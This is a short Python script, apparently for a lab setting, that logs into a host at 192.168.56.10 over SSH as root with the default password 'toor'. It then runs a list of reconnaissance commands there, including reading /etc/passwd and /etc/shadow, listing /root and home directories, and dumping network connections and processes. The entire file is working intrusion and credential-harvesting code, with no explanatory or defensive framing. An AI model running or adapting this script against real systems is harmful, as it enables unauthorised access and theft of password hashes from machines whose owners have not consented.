import paramiko, time

TARGET_IP = "192.168.56.10"
USERNAME = "root"
PASSWORD = "toor"

RECON_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ifconfig",
    "netstat -an",
    "ps aux",
    "ls -la /home",
    "ls -la /root",
    "history",
]

print(f"[*] Connecting to {TARGET_IP} as {USERNAME}")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD, timeout=5)
    print("[*] Connected. Running recon commands...")
    for cmd in RECON_COMMANDS:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        output = stdout.read().decode()
        print(f"  $ {cmd} -> {output[:60].strip()}")
        time.sleep(1)
    ssh.close()
    print("[*] Session complete.")
except Exception as e:
    print(f"[!] Error: {e}")
